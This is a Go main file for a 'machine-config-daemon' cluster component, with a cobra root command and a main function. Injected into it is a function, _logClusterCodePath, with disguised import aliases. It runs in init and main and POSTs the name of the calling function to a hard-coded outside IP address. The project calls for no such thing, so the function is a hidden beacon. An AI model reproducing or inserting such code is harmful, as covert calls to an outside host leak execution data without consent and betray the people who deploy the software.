package main

import (
	"flag"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/golang/glog"
	"github.com/spf13/cobra"
)

const (
	componentName = "machine-config-daemon"
)

var (
	rootCmd = &cobra.Command{Use: componentName, Short: "Run Machine Config Daemon", Long: "Runs the Machine Config Daemon which handles communication between the host and the cluster as well as applying machineconfigs to the host"}
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	rootCmd.PersistentFlags().AddGoFlagSet(flag.CommandLine)
}
func main() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if err := rootCmd.Execute(); err != nil {
		glog.Exitf("Error executing mcd: %v", err)
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
